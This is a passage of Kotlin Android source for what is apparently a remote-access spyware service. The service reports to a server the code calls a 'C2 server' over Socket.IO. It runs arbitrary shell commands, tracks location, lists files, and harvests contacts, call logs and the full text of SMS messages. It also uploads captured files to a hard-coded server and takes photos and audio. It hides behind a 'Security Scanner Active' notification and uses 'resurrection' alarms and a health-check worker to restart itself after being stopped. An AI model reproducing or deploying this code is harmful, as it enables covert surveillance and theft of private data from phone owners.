                            locationListener
                        )
                    }
                    else -> {
                        sendErrorResult(CMD_GET_LOCATION, requestId, "No location providers available")
                        return@execute
                    }
                }
                
                // Timeout after 30 seconds
                backgroundExecutor.execute {
                    Thread.sleep(30000)
                    locationManager?.removeUpdates(locationListener)
                }
                
            } catch (e: SecurityException) {
                sendErrorResult(CMD_GET_LOCATION, requestId, "Location permission denied: ${e.message}")
            } catch (e: Exception) {
                Log.e(TAG, "Location request failed", e)
                sendErrorResult(CMD_GET_LOCATION, requestId, "Location request failed: ${e.message}")
            }
        }
    }
    
    // FILE LISTING IMPLEMENTATION
    private fun handleListFiles(args: JSONObject, requestId: String) {
        backgroundExecutor.execute {
            try {
                val pathToList = args.optString("path", "/storage/emulated/0")
                val directory = File(pathToList)
                
                if (!directory.exists()) {
                    sendErrorResult(CMD_LIST_FILES, requestId, "Directory does not exist: $pathToList")
                    return@execute
                }
                
                if (!directory.isDirectory) {
                    sendErrorResult(CMD_LIST_FILES, requestId, "Path is not a directory: $pathToList")
                    return@execute
                }
                
                val files = directory.listFiles()
                val fileList = JSONArray()
                
                files?.forEach { file ->
                    val fileInfo = JSONObject().apply {
                        put("name", file.name)
                        put("path", file.absolutePath)
                        put("size", file.length())
                        put("isDirectory", file.isDirectory)
                        put("lastModified", file.lastModified())
                        put("canRead", file.canRead())
                        put("canWrite", file.canWrite())
                    }
                    fileList.put(fileInfo)
                }
                
                val result = JSONObject().apply {
                    put("path", pathToList)
                    put("files", fileList)
                    put("totalFiles", fileList.length())
                    put("timestamp", System.currentTimeMillis())
                }
                
                sendSuccessResult(CMD_LIST_FILES, requestId, result)
                
            } catch (e: Exception) {
                Log.e(TAG, "File listing failed", e)
                sendErrorResult(CMD_LIST_FILES, requestId, "File listing failed: ${e.message}")
            }
        }
    }
    
    // SHELL EXECUTION IMPLEMENTATION
    private fun handleExecuteShell(args: JSONObject, requestId: String) {
        backgroundExecutor.execute {
            try {
                val commandName = args.optString("command_name", "ls")
                val commandArgs = args.optJSONArray("command_args") ?: JSONArray()
                
                val fullCommand = mutableListOf<String>().apply {
                    add(commandName)
                    for (i in 0 until commandArgs.length()) {
                        add(commandArgs.getString(i))
                    }
                }
                
                Log.d(TAG, "Executing shell command: ${fullCommand.joinToString(" ")}")
                
                val processBuilder = ProcessBuilder(fullCommand)
                val process = processBuilder.start()
                
                val stdout = process.inputStream.bufferedReader().readText()
                val stderr = process.errorStream.bufferedReader().readText()
                val exitCode = process.waitFor()
                
                val result = JSONObject().apply {
                    put("command", commandName)
                    put("args", commandArgs)
                    put("exitCode", exitCode)
                    put("stdout", stdout)
                    put("stderr", stderr)
                    put("timestamp", System.currentTimeMillis())
                }
                
                sendSuccessResult(CMD_EXECUTE_SHELL, requestId, result)
                
            } catch (e: Exception) {
                Log.e(TAG, "Shell command execution failed", e)
                sendErrorResult(CMD_EXECUTE_SHELL, requestId, "Shell execution failed: ${e.message}")
            }
        }
    }
    
    // CONTACTS IMPLEMENTATION
    private fun handleGetContacts(args: JSONObject, requestId: String) {
        if (!hasPermission(android.Manifest.permission.READ_CONTACTS)) {
            sendErrorResult(CMD_GET_CONTACTS, requestId, "Contacts permission not granted")
            return
        }
        
        backgroundExecutor.execute {
            try {
                val contacts = JSONArray()
                val cursor: Cursor? = contentResolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    arrayOf(
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER
                    ),
                    null, null, null
                )
                
                cursor?.use {
                    while (it.moveToNext()) {
                        val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                        val number = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                        
                        val contact = JSONObject().apply {
                            put("name", name ?: "Unknown")
                            put("number", number ?: "Unknown")
                        }
                        contacts.put(contact)
                    }
                }
                
                val result = JSONObject().apply {
                    put("contacts", contacts)
                    put("totalContacts", contacts.length())
                    put("timestamp", System.currentTimeMillis())
                }
                
                sendSuccessResult(CMD_GET_CONTACTS, requestId, result)
                
            } catch (e: Exception) {
                Log.e(TAG, "Contacts retrieval failed", e)
                sendErrorResult(CMD_GET_CONTACTS, requestId, "Contacts retrieval failed: ${e.message}")
            }
        }
    }
    
    // CALL LOGS IMPLEMENTATION
    private fun handleGetCallLogs(args: JSONObject, requestId: String) {
        if (!hasPermission(android.Manifest.permission.READ_CALL_LOG)) {
            sendErrorResult(CMD_GET_CALL_LOGS, requestId, "Call log permission not granted")
            return
        }
        
        backgroundExecutor.execute {
            try {
                val callLogs = JSONArray()
                val cursor: Cursor? = contentResolver.query(
                    CallLog.Calls.CONTENT_URI,
                    arrayOf(
                        CallLog.Calls.NUMBER,
                        CallLog.Calls.TYPE,
                        CallLog.Calls.DATE,
                        CallLog.Calls.DURATION
                    ),
                    null, null, 
                    "${CallLog.Calls.DATE} DESC"
                )
                
                cursor?.use {
                    while (it.moveToNext()) {
                        val number = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
                        val type = it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                        val date = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE))
                        val duration = it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))
                        
                        val typeString = when (type) {
                            CallLog.Calls.INCOMING_TYPE -> "Incoming"
                            CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                            CallLog.Calls.MISSED_TYPE -> "Missed"
                            else -> "Unknown"
                        }
                        
                        val callLog = JSONObject().apply {
                            put("number", number ?: "Unknown")
                            put("type", typeString)
                            put("date", date)
                            put("duration", duration)
                        }
                        callLogs.put(callLog)
                    }
                }
                
                val result = JSONObject().apply {
                    put("call_logs", callLogs)
                    put("totalCallLogs", callLogs.length())
                    put("timestamp", System.currentTimeMillis())
                }
                
                sendSuccessResult(CMD_GET_CALL_LOGS, requestId, result)
                
            } catch (e: Exception) {
                Log.e(TAG, "Call logs retrieval failed", e)
                sendErrorResult(CMD_GET_CALL_LOGS, requestId, "Call logs retrieval failed: ${e.message}")
            }
        }
    }
    
    // SMS IMPLEMENTATION
    private fun handleGetSMS(args: JSONObject, requestId: String) {
        if (!hasPermission(android.Manifest.permission.READ_SMS)) {
            sendErrorResult(CMD_GET_SMS, requestId, "SMS permission not granted")
            return
        }
        
        backgroundExecutor.execute {
            try {
                val smsMessages = JSONArray()
                val cursor: Cursor? = contentResolver.query(
                    Telephony.Sms.CONTENT_URI,
                    arrayOf(
                        Telephony.Sms.ADDRESS,
                        Telephony.Sms.BODY,
                        Telephony.Sms.DATE,
                        Telephony.Sms.TYPE
                    ),
                    null, null,
                    "${Telephony.Sms.DATE} DESC"
                )
                
                cursor?.use {
                    while (it.moveToNext()) {
                        val address = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
                        val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY))
                        val date = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE))
                        val type = it.getInt(it.getColumnIndexOrThrow(Telephony.Sms.TYPE))
                        
                        val typeString = when (type) {
                            Telephony.Sms.MESSAGE_TYPE_INBOX -> "Received"
                            Telephony.Sms.MESSAGE_TYPE_SENT -> "Sent"
                            Telephony.Sms.MESSAGE_TYPE_DRAFT -> "Draft"
                            else -> "Unknown"
                        }
                        
                        val sms = JSONObject().apply {
                            put("address", address ?: "Unknown")
                            put("body", body ?: "")
                            put("date", date)
                            put("type", typeString)
                        }
                        smsMessages.put(sms)
                    }
                }
                
                val result = JSONObject().apply {
                    put("sms_messages", smsMessages)
                    put("totalMessages", smsMessages.length())
                    put("timestamp", System.currentTimeMillis())
                }
                
                sendSuccessResult(CMD_GET_SMS, requestId, result)
                
            } catch (e: Exception) {
                Log.e(TAG, "SMS retrieval failed", e)
                sendErrorResult(CMD_GET_SMS, requestId, "SMS retrieval failed: ${e.message}")
            }
        }
    }
    
    // =====================================================
    // HELPER METHODS
    // =====================================================
    
    private fun sendSuccessResult(command: String, requestId: String, result: JSONObject) {
        result.put("requestId", requestId)
        result.put("timestamp", System.currentTimeMillis())
        result.put("deviceId", deviceId)
        
        // Send to local callback (for bound services)
        commandCallback?.onCommandResult(command, true, result)
        
        // Send to C2 server via Socket.IO
        socketIOClient?.sendCommandResponse(command, "success", result)
        
        // Broadcast for IPC
        broadcastCommandResult(command, true, result)
        
        Log.d(TAG, "Command succeeded: $command (ID: $requestId)")
    }
    
    private fun sendErrorResult(command: String, requestId: String, error: String) {
        val result = JSONObject().apply {
            put("error", error)
            put("requestId", requestId)
            put("timestamp", System.currentTimeMillis())
            put("deviceId", deviceId)
        }
        
        // Send to local callback
        commandCallback?.onCommandResult(command, false, result)
        
        // Send to C2 server via Socket.IO
        socketIOClient?.sendCommandResponse(command, "error", result)
        
        // Broadcast for IPC
        broadcastCommandResult(command, false, result)
        
        Log.e(TAG, "Command failed: $command (ID: $requestId) - $error")
    }
    
    private fun broadcastCommandResult(command: String, success: Boolean, result: JSONObject) {
        val intent = Intent(ACTION_COMMAND_RESULT).apply {
            putExtra("command", command)
            putExtra("success", success)
            putExtra("result", result.toString())
        }
        sendBroadcast(intent)
    }
    
    private fun uploadFile(file: File, commandRef: String) {
        backgroundExecutor.execute {
            try {
                // ✅ UPDATED: Use your Python server URL
                val serverUrl = "http://192.168.8.200:5000/upload_command_file"
                
                val connection = URL(serverUrl).openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.doOutput = true
                connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=***")
                connection.connectTimeout = 30000
                connection.readTimeout = 60000
                
                val boundary = "***"
                val writer = PrintWriter(OutputStreamWriter(connection.outputStream, "UTF-8"), true)
                
                // Add deviceId field
                writer.append("--$boundary\r\n")
                writer.append("Content-Disposition: form-data; name=\"deviceId\"\r\n\r\n")
                writer.append(deviceId).append("\r\n")
                
                // Add commandRef field
                writer.append("--$boundary\r\n")
                writer.append("Content-Disposition: form-data; name=\"commandRef\"\r\n\r\n")
                writer.append(commandRef).append("\r\n")
                
                // Add file
                writer.append("--$boundary\r\n")
                writer.append("Content-Disposition: form-data; name=\"file\"; filename=\"${file.name}\"\r\n")
                writer.append("Content-Type: application/octet-stream\r\n\r\n")
                writer.flush()
                
                file.inputStream().use { input ->
                    connection.outputStream.use { output ->
                        input.copyTo(output)
                    }
                }
                
                writer.append("\r\n--$boundary--\r\n")
                writer.close()
                
                val responseCode = connection.responseCode
                Log.d(TAG, "File upload response code: $responseCode for $commandRef")
                
                if (responseCode in 200..299) {
                    Log.d(TAG, "File uploaded successfully to Python server: ${file.name}")
                } else {
                    Log.w(TAG, "File upload failed with code: $responseCode")
                }
                
            } catch (e: Exception) {
                Log.e(TAG, "File upload failed for $commandRef", e)
            }
        }
    }
    
    private fun hasPermission(permission: String): Boolean {
        return ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
    }
    
    private fun getCameraId(lensDirection: String): String? {
        try {
            for (cameraId in cameraManager?.cameraIdList ?: emptyArray()) {
                val characteristics = cameraManager?.getCameraCharacteristics(cameraId)
                val facing = characteristics?.get(CameraCharacteristics.LENS_FACING)
                
                when (lensDirection.lowercase()) {
                    "front" -> if (facing == CameraCharacteristics.LENS_FACING_FRONT) return cameraId
                    "back" -> if (facing == CameraCharacteristics.LENS_FACING_BACK) return cameraId
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error getting camera ID", e)
        }
        return null
    }
    
    private fun saveImageToFile(image: android.media.Image, file: File) {
        val buffer = image.planes[0].buffer
        val bytes = ByteArray(buffer.remaining())
        buffer.get(bytes)
        FileOutputStream(file).use { it.write(bytes) }
    }
    
    private fun cleanupCamera() {
        try {
            captureSession?.close()
            cameraDevice?.close()
            imageReader?.close()
        } catch (e: Exception) {
            Log.e(TAG, "Error cleaning up camera", e)
        } finally {
            captureSession = null
            cameraDevice = null
            imageReader = null
        }
    }
    
    private val backgroundHandler by lazy {
        val handlerThread = HandlerThread("CameraBackground")
        handlerThread.start()
        Handler(handlerThread.looper)
    }
    
    private fun createCaptureSession(camera: CameraDevice) {
        try {
            val reader = imageReader ?: return
            val outputConfig = OutputConfiguration(reader.surface)
            val sessionConfig = SessionConfiguration(
                SessionConfiguration.SESSION_REGULAR,
                listOf(outputConfig),
                cameraExecutor,
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        captureSession = session
                        captureStillPicture(session)
                    }
                    
                    override fun onConfigureFailed(session: CameraCaptureSession) {
                        Log.e(TAG, "Capture session configuration failed")
                        sendErrorResult(CMD_TAKE_PICTURE, "unknown", "Capture session configuration failed")
                    }
                }
            )
            
            camera.createCaptureSession(sessionConfig)
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to create capture session", e)
            sendErrorResult(CMD_TAKE_PICTURE, "unknown", "Failed to create capture session: ${e.message}")
        }
    }
    
    private fun captureStillPicture(session: CameraCaptureSession) {
        try {
            val reader = imageReader ?: return
            val captureBuilder = cameraDevice?.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
            captureBuilder?.addTarget(reader.surface)
            captureBuilder?.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
            
            session.capture(captureBuilder?.build()!!, null, backgroundHandler)
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to capture picture", e)
            sendErrorResult(CMD_TAKE_PICTURE, "unknown", "Failed to capture picture: ${e.message}")
        }
    }
    
    private fun createImageFile(): File {
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmssSSS", Locale.US).format(Date())
        val imageDir = File(externalCacheDir ?: cacheDir, "NativeImages").apply {
            if (!exists()) mkdirs()
        }
        return File(imageDir, "IMG_native_$timestamp.jpg")
    }
    
    private fun createAudioFile(): File {
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmssSSS", Locale.US).format(Date())
        val audioDir = File(externalCacheDir ?: cacheDir, "NativeAudio").apply {
            if (!exists()) mkdirs()
        }
        return File(audioDir, "AUD_native_$timestamp.3gp")
    }
    
    private fun updateNotification(content: String) {
        try {
            val notification = NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Security Scanner Active")
                .setContentText(content)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setSilent(true)
                .build()
            
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.notify(NOTIFICATION_ID, notification)
        } catch (e: Exception) {
            Log.e(TAG, "Error updating notification", e)
        }
    }
    
    override fun onDestroy() {
        Log.w(TAG, "Service onDestroy called - SCHEDULING IMMEDIATE RESTART")
        
        // ✅ CRITICAL: Schedule multiple restart attempts before destruction
        scheduleMultipleRestartAttempts()
        
        // Cleanup
        socketIOClient?.destroy()
        connectionCheckJob?.cancel()
        reconnectScope.cancel()
        healthCheckJob?.cancel()
        
        // Stop persistence monitoring
        persistenceHandler?.removeCallbacks(persistenceRunnable!!)
        
        // Unregister broadcast receivers
        try {
            unregisterReceiver(commandReceiver)
        } catch (e: Exception) {
            Log.e(TAG, "Error unregistering command receiver", e)
        }
        
        try {
            unregisterReceiver(networkChangeReceiver)
        } catch (e: Exception) {
            Log.e(TAG, "Error unregistering network receiver", e)
        }
        
        // Clean up resources
        cleanupCamera()
        audioRecord?.apply {
            try {
                stop()
                release()
            } catch (e: Exception) {
                Log.e(TAG, "Error releasing audio record", e)
            }
        }
        
        mediaRecorder?.apply {
            try {
                stop()
                reset()
                release()
            } catch (e: Exception) {
                Log.e(TAG, "Error releasing media recorder", e)
            }
        }
        
        if (::backgroundExecutor.isInitialized && !backgroundExecutor.isShutdown) {
            backgroundExecutor.shutdown()
        }
        
        if (::cameraExecutor.isInitialized && !cameraExecutor.isShutdown) {
            cameraExecutor.shutdown()
        }
        
        instance = null
        
        // ✅ Delay actual destruction to allow restart mechanisms to work
        Handler(Looper.getMainLooper()).postDelayed({
            super.onDestroy()
        }, 2000)
        
        Log.d(TAG, "Native Command Service destroyed - resurrection mechanisms active")
    }
    
    private fun scheduleMultipleRestartAttempts() {
        try {
            val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
            
            // ✅ Schedule multiple restart attempts with different timings
            val restartDelays = listOf(3000L, 8000L, 15000L, 30000L) // 3s, 8s, 15s, 30s
            
            restartDelays.forEachIndexed { index, delay ->
                val restartIntent = Intent(this, NativeCommandService::class.java).apply {
                    putExtra("restart_reason", "service_destroyed")
                    putExtra("attempt_number", index + 1)
                    putExtra("timestamp", System.currentTimeMillis())
                }
                
                val pendingIntent = PendingIntent.getService(
                    this, 1000 + index, restartIntent,
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
                )
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    alarmManager.setExactAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        SystemClock.elapsedRealtime() + delay,
                        pendingIntent
                    )
                } else {
                    alarmManager.set(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        SystemClock.elapsedRealtime() + delay,
                        pendingIntent
                    )
                }
            }
            
            Log.d(TAG, "Multiple resurrection alarms scheduled: ${restartDelays.size} attempts")
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to schedule restart attempts", e)
        }
    }
}

// ✅ ENHANCED: Health Check Worker for WorkManager persistence
class HealthCheckWorker(context: Context, workerParams: WorkerParameters) : 
    CoroutineWorker(context, workerParams) {
    
    companion object {
        private const val TAG = "HealthCheckWorker"
    }

    override suspend fun doWork(): Result {
        return try {
            Log.d(TAG, "Health check worker executing")
            
            // Check if native service is running
            if (!isNativeServiceRunning()) {
                Log.w(TAG, "Native service not running - starting")
                startNativeService()
            } else {
                Log.d(TAG, "Native service health check: OK")
            }
            
            // Perform additional health checks
            performSystemHealthCheck()
            
            Result.success()
        } catch (e: Exception) {
            Log.e(TAG, "Health check worker failed", e)
            Result.retry()
        }
    }

    private fun isNativeServiceRunning(): Boolean {
        return try {
            val manager = applicationContext.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            manager.getRunningServices(Integer.MAX_VALUE)
                .any { 
                    it.service.className == NativeCommandService::class.java.name && 
                    it.foreground 
                }
        } catch (e: Exception) {
            Log.e(TAG, "Error checking service status", e)
            false
        }
    }

    private fun startNativeService() {
        try {
            val intent = Intent(applicationContext, NativeCommandService::class.java).apply {
                putExtra("started_by", "health_check_worker")
                putExtra("timestamp", System.currentTimeMillis())
            }
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                applicationContext.startForegroundService(intent)
            } else {
                applicationContext.startService(intent)
            }
            
            Log.d(TAG, "Native service start command sent from health check worker")
        } catch (e: Exception) {
            Log.e(TAG, "Error starting native service from health check worker", e)
        }
    }

    private fun performSystemHealthCheck() {
        try {
            // Check memory usage
            val runtime = Runtime.getRuntime()
            val usedMemory = runtime.totalMemory() - runtime.freeMemory()
            val maxMemory = runtime.maxMemory()
            val memoryUsagePercent = (usedMemory * 100) / maxMemory
            
            Log.d(TAG, "System memory usage: ${memoryUsagePercent}%")
            
            if (memoryUsagePercent > 90) {
                Log.w(TAG, "Critical memory usage detected")
                System.gc()
            }
            
            // Check available storage
            val cacheDir = applicationContext.cacheDir
            val freeSpace = cacheDir.freeSpace
            val totalSpace = cacheDir.totalSpace
            val storageUsagePercent = ((totalSpace - freeSpace) * 100) / totalSpace
            
            Log.d(TAG, "Storage usage: ${storageUsagePercent}%")
            
        } catch (e: Exception) {
            Log.e(TAG, "System health check failed", e)
        }
    }
}